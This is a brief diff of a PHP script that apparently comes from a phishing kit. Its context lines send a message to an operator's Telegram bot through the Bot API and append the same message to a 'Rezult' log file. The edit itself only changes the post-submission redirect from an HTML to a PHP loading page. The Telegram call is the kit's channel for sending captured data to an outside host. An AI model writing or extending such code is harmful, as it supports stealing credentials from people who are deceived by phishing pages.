@@ -24,6 +24,6 @@ file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=120880
 $file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
 fwrite($file,$message); 
 
-header("Location: ../loading.html");
+header("Location: ../loading.php");
 
 ?>
